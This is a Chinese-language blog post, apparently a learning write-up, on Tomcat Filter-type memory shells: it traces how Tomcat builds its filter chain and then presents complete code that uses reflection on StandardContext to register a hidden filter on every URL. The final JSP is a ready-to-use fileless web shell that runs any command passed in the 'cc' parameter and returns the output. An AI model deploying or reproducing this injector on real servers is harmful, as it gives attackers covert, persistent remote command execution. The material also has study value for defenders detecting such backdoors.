---
title: Tomcat内存马—Filter型
date: 2023-06-11 23:42:29
excerpt: Tomcat内存马—Filter型
categories: 学习
---



## Filter

Filter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 `web.xml`中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。



从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。

### 测试demo

为了更好的理解Filter，写一个demo

testfilter.java

```auto
import javax.servlet.*;
import java.io.IOException;

public class testfilter implements Filter{
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("filter初始化");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("dofilter");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```

web.xml

```auto
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <filter>
        <filter-name>testfilter</filter-name>
        <filter-class>testfilter</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>testfilter</filter-name>
        <url-pattern>/filter</url-pattern>
    </filter-mapping>

    <servlet>
        <!--servlet名字，和类名一致-->
        <servlet-name>test</servlet-name>
        <!--class文件名，如果有包要加上包名-->
        <servlet-class>test</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>test</servlet-name>
        <!--url-->
        <url-pattern>/test</url-pattern>
    </servlet-mapping>
</web-app>
```

然后访问一下 `/filter`



成功触发过滤器

### Filter相关类

from [https://paper.seebug.org/1441/#tomcat](https://paper.seebug.org/1441/#tomcat)

+   **Filter**
    
    ```auto
    过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。
    ```
    
+   **FilterChain**
    
    ```auto
    过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain
    ```
    
+   **FilterConfig**
    
    ```auto
    过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。
    ```
    
+   **FilterDef**
    
    ```auto
    过滤器的配置和描述
    ```
    
+   **ApplicationFilterChain**
    
    ```auto
    调用过滤器链
    ```
    
+   **ApplicationFilterConfig**
    
    ```auto
    获取过滤器
    ```
    
+   **ApplicationFilterFactory**
    
    ```auto
    组装过滤器链
    ```
    
+   **WebXml**
    
    ```auto
    一个存放web.xml中内容的类
    ```
    
+   **ContextConfig**
    
    ```auto
    一个web应用的上下文配置类
    ```
    
+   **StandardContext**
    
    ```auto
    一个web应用上下文(Context接口)的标准实现
    ```
    
+   **StandardWrapperValve**
    
    ```auto
    一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。
    
    ```
    

### Tomcat Filter调用流程

首先 `ContextConfig$configureContext` 对 `web.xml` 进行解析，获取到 `WebXml` 实例



然后直接看到 `StandardWrapperValve` ，在这里将会完成过滤器的组装

```auto
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
```

看到这行代码，发现 `filterchain` 是由 `ApplicationFilterFactory$createFilterChain` 创建的，跟进该方法



前面的代码主要是初始化 `filterchain` 变量，这里使用 `StandardWrapper$getParent` 获取当前 `Context` 也就是当前运行的WEB应用，然后使用 `Context` 的 `findFilterMaps` 获取到 `filterMaps`



`filterMaps` 中存放了已定义的及自带的 `filterMap` ，而 `filterMap` 中存放了 filtername 及 url，然后看看 `filter` 的组装逻辑



`for循环` 遍历 `filterMaps` ，如果当前请求的 `url` 和 `filterMap` 中的 `urlPatterns` 相同，就会调用 `findFilterConfig` 方法寻找对应 `filtername` 的 `FilterConfig` ，如果找到就调用 `addFilter` 方法将 `filterConfig` 加入到 `filterChain`

跟进 `addFilter` 方法，该方法首先遍历 `filterChain` ，看看要添加的 `filter` 是否已经存在。如果存在就直接 `return`



如果n等于 `filters` 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 `filters` 。至此 `filterChain` 也就组装完成了，接着回到 `StandardWrapperValve` 执行 `ApplicationFilterChain$doFilter`



然后跟进 `doFilter` 方法



调用了 `internalDoFilter` 方法



先获取 `filterConfig` ，然后通过 `filterConfig.getFilter()` 获取到 `filter` ，再调用 `filter` 的 `doFilter` 方法，就结束了 Filter 的调用。

总结一下流程

+   先从当前 `Context` 中获取到 `filterMaps`
+   筛选出 `urlPattern` 与当前请求 url 相符合的 `filtername`
+   根据 `filtername` 找到对应的 `FilterConfig`
+   将 `FilterConfig` 加入到 `filterChain`
+   调用 `filterChain` 的 `internalDoFilter` 遍历获取 `FilterConfig`
+   然后获取 `FiletrConfig` 对应的 `Filter` ，并调用 `Filter` 的 `doFilter`

## filter内存马注入

理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 `filter` 注入。

回想一下 `filter` 的获取流程，可以发现 `filterMaps` 是从当前 `context` 中获取到的



那如果我们可以对这个 `context` 中存储的 `filterMaps` 进行修改是不是就可以注入自己的恶意 `filter` 了。

那么怎么修改呢，我们先看一下这个 `context` ， `StandardContext` 有三个关于 `filter` 的成员变量



+   filterConfigs：存储 `filterConfig` 的 `HashMap` ， `filterConfig` 中又存储了 `FilterDef` 和 `filter` 对象
+   filterDefs：存放 `FilterDef` 的 `HashMap` ，**FilterDef**中存储着过滤器名，过滤器实例，匹配的url 等
+   filterMaps：存放 `FilterMap` 的 `HashMap` ， `FilterMap` 中主要存放了 `FilterName` 和对应的 `URLPattern`

注入流程如下

+   创建恶意 `filter`
+   使用 `FilterDef` 封装恶意 `filter`
+   将该 `FilterDef` 添加到 `FilterDefs` 和 `FilterConfig`
+   建立恶意 `filter` 对应的 `filterMap` ，并将其加入到 `filterMaps` 中(将其放到最前面)

大概代码

```auto
//创建filter
        Filter filter=new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cc") != null){
                    byte[] bytes = new byte[1024];
                    InputStream in = Runtime.getRuntime().exec("cmd /c"+req.getParameter("cc")).getInputStream();

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] b = new byte[1024];
                    int a = -1;

                    while ((a = in.read(b)) != -1) {
                        baos.write(b, 0, a);
                    }
                    servletResponse.getWriter().write(new String(baos.toByteArray()));
                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }
        };

        //封装filter
        String filtername="novic4";
        FilterDef filterDef=new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(filtername);
        filterDef.setFilterClass(filter.getClass().getName());

        //将filterdef添加到filterdefs中
        standardContext.addFilterDef(filterDef);

        //将filterdef添加到filterconfig中
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        //建立对应得filterMap
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(filtername);
        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        //插入filterMaps，将其插到首位
        standardContext.addFilterMapBefore(filterMap);

        //添加到filterconfigs
        Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        Map filterConfigs = (Map) Configs.get(standardContext);
        filterConfigs.put(filtername,filterConfig);
```

要想修改这个 `context` ，就需要先获取到该 `context`,已知有三种获取方式

+   **将 `servletcontext` 转换成 `StandardContext`**
    
    ```auto
    web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用
    ```
    
    ```auto
    ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
            // ApplicationContext 为 ServletContext 的实现类
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    ```
    
+   ****通过Mbean获取context****
    
    ```auto
    [https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)
    ```
    
+   **从线程中获取StandardContext**
    
    ```auto
    [https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)
    
    ```
    

这里使用第一种方式写一个内存马

```auto
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //创建filter
    Filter filter=new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {

        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cc") != null){
                byte[] bytes = new byte[1024];
                InputStream in = Runtime.getRuntime().exec("cmd /c"+req.getParameter("cc")).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                servletResponse.getWriter().write(new String(baos.toByteArray()));
                return;
            }
            filterChain.doFilter(servletRequest,servletResponse);
        }

        @Override
        public void destroy() {

        }
    };

    //封装filter
    String filtername="novic4";
    FilterDef filterDef=new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(filtername);
    filterDef.setFilterClass(filter.getClass().getName());

    //将filterdef添加到filterdefs中
    standardContext.addFilterDef(filterDef);

    //将filterdef添加到filterconfig中
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

    //建立对应得filterMap
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(filtername);
    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3
    filterMap.setDispatcher(DispatcherType.REQUEST.name());

    //插入filterMaps，将其插到首位
    standardContext.addFilterMapBefore(filterMap);

    //添加到filterconfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    filterConfigs.put(filtername,filterConfig);
    out.print("bingo");
%>
```



不过中文回显还是有点问题

